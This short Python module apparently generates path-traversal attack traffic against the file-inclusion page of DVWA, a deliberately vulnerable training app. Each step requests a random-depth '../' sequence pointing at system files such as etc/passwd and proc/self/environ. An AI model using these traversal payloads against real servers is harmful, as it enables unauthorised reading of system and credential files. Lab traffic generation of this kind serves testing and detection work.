"""Path traversal against DVWA's file-inclusion page: one GET with a ../ sequence of varying depth per step."""
import requests

ATTACK_TYPE = "traversal"
DEFAULT_RATE = 1.0

TARGET_FILES = ["etc/passwd", "etc/hosts", "proc/self/environ", "windows/win.ini"]


def step(ctx):
    base = ctx.targets["dvwa"]
    depth = ctx.rng.randint(1, 8)
    page = "../" * depth + ctx.rng.choice(TARGET_FILES)
    requests.get(f"{base}/vulnerabilities/fi/", params={"page": page},
                 cookies={"security": "low"}, timeout=ctx.timeout)
